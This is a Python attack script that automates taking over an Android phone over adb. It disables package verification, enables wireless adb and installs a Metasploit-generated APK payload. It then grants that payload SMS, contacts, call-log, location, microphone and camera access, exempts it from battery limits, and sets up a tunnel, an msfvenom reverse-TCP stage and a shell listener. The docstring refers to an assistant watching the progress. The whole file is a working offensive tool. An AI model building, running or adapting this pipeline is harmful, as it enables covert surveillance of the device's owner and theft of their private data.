#!/usr/bin/env python3
"""AUTO-PIVOT (zero-input) — full takeover, no Enter required.

USB connect → tcpip 5555 → Wi-Fi IP → (auto-wait for USB unplug, max 30s OR
just continue if already wireless) → build FGS payload → install → reverse →
tunnel → pure-python shell. Logs to .payload-build/auto_pivot.log AND prints
to the terminal, so both the operator and this assistant can see progress.
"""
from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

LOG_PATH = ROOT / ".payload-build" / "auto-pivot.log"
LPORT = 4444
PKG = "com.metasploit.stage"


def log(msg: str) -> None:
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    try:
        with open(LOG_PATH, "a") as f:
            f.write(line + "\n")
    except OSError:
        pass


def sh(args, **kw):
    return subprocess.run(args, capture_output=True, text=True, **kw)


def adb(args, serial=None):
    return sh((["adb", "-s", serial] if serial else ["adb"]) + args)


def first_usb():
    out = sh(["adb", "devices"]).stdout
    for line in out.splitlines()[1:]:
        p = line.split()
        if len(p) >= 2 and p[1] == "device" and ":" not in p[0]:
            return p[0]
    return None


def first_any():
    out = sh(["adb", "devices"]).stdout
    for line in out.splitlines()[1:]:
        p = line.split()
        if len(p) >= 2 and p[1] == "device":
            return p[0]
    return None


def wifi_ip(serial):
    for args in (
        ["shell", "ip", "-f", "inet", "addr", "show", "wlan0"],
        ["shell", "ip", "route", "get", "8.8.8.8"],
    ):
        out = adb(args, serial).stdout
        import re

        m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", out) or re.search(
            r"\bsrc\s+(\d+\.\d+\.\d+\.\d+)", out
        )
        if m:
            ip = m.group(1)
            if ip != "127.0.0.1" and not ip.startswith("169.254."):
                return ip
    return None


def main():
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    log("=== AUTO-FULL PIPELINE START ===")

    # ---- Phase A: find device (USB-first) ---------------------------------
    usb = first_usb_safe = first_usb = None
    for i in range(15):  # 30s grace
        usb = first_any()
        if usb:
            break
        log(f"waiting for device... ({i + 1}/15)")
        time.sleep(2)
    if not usb:
        log("NO DEVICE after 30s — abort")
        return 1
    log(f"device found: {usb}")

    is_usb = ":" not in usb
    if is_usb:
        log("Phase A — USB prime: tcpip 5555")
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"], usb)
        adb(["tcpip", "5555"], usb)
        time.sleep(3)
        ip = wifi_ip(usb)
        if ip:
            log(f"device Wi-Fi IP: {ip}")
            log("Phase B — unplug USB now if you want wireless (waiting 12s for adb connect)...")
            # try connect over wifi immediately (works even while USB still attached)
            r = sh(["adb", "connect", f"{ip}:5555"])
            log(f"adb connect {ip}:5555 → " + ("ok" if "connected" in r.stdout else "wait"))
        else:
            log("no wifi ip read; continuing with USB channel only")

    # find wireless serial (after pivot) or keep usb
    serial = first_any()
    if serial != usb:
        log(f"pivot ok — now using {serial}")

    # ---- Phase C: payload (FGS) -------------------------------------------
    log("Phase C — building FGS payload LHOST=127.0.0.1")
    apk = ROOT / ".payload-build" / "full-auto.apk"
    r = sh(["bash", str(ROOT / "build_payload.sh"), "--fgs", "127.0.0.1", str(LPORT), str(apk)])
    if r.returncode != 0:
        log(f"payload build FAILED: {r.stderr[-200:]}")
        return 1
    log(f"payload built: {apk.name}")

    r = adb(["-s", serial, "install", "-r", str(apk)])
    if r.returncode != 0:
        adb(["-s", serial, "uninstall", PKG])
        r = adb(["-s", serial, "install", str(apk)])
    if r.returncode != 0:
        log(f"install FAILED: {(r.stderr or r.stdout)[-200:]}")
        return 1
    log("payload installed")

    for perm in ("POST_NOTIFICATIONS", "READ_SMS", "READ_CONTACTS", "READ_CALL_LOG",
                 "ACCESS_FINE_LOCATION", "RECORD_AUDIO", "CAMERA"):
        adb(["-s", serial, "shell", "pm", "grant", PKG, f"android.permission.{perm}"])
    adb(["-s", serial, "shell", "dumpsys", "deviceidle", "whitelist", "+" + PKG])
    adb(["-s", serial, "reverse", f"tcp:{LPORT}", f"tcp:{LPORT}"])
    log("reverse set + perms granted")

    # ---- Phase E: tunnel ---------------------------------------------------
    log("Phase E — tunnel (pinggy/ngrok auto)")
    try:
        from modules.tunnel import start_tunnel

        tun = start_tunnel(LPORT)
        log(f"tunnel: {tun.endpoint if tun.endpoint_host else 'NOT UP'} → localhost:{LPORT}")
    except Exception as e:
        log(f"tunnel failed: {e}")

    # ---- Phase F: launch + shell --------------------------------------------
    log("launching payload")
    adb(["-s", serial, "shell", "am", "force-stop", PKG])
    adb(["-s", serial, "shell", "am", "start", "-n", f"{PKG}/.MainActivity"])

    log("PLAIN SHELL LISTENER on 127.0.0.1:4444 (device will dial via reverse)")
    # capture stage for staged payload
    stage = ROOT / ".payload-build" / "shell-stage.bin"
    if not stage.exists():
        sh(["msfvenom", "-p", "android/shell/reverse_tcp",
            "LHOST=127.0.0.1", f"LPORT={LPORT}", "-f", "raw", "-o", str(stage)])
    try:
        from modules.shell_access import run

        run("127.0.0.1", LPORT, timeout=150, stage_file=str(stage) if stage.exists() else None)
    except (KeyboardInterrupt, EOFError):
        log("shell detached")
    log("pipeline complete — back")


if __name__ == "__main__":
    main()